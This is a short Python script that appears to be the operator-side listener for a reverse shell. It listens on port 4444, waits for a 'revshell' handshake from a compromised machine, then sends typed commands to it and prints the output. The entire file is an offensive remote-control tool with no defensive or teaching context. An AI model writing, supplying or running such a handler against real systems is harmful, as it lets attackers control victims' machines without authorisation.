import socket
import threading
import os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def receive(client):
    out = ""
    recvlen = 0
    while True:
        data = client.recv(4096)
        recvlen = len(data)
        out += data.decode()

        if not data:
            break

    print(out)

sock.bind(("0.0.0.0", 4444))

sock.listen(5)

client, addr = sock.accept()

out = client.recv(1024).decode()

if (out != "revshell"):
    print("[!] Incoming protocol is not a reverse shell. Exiting.")
    exit(0)

print("[*] Recieved reverse shell from {}:{}".format(addr[0], addr[1]))

while True:
    cmd = input("CMD> ")
    request = cmd + ("0" * (1024 - len(cmd)))

    if (cmd == "shut"):
        client.send(request.encode())
        print("[*] Closing remote socket...")
        exit(0)
    elif (cmd == "clear"):
        os.system("clear")
    else:
        client.send(request.encode())
        t = threading.Thread(target=receive, args=(client,))
        t.start()


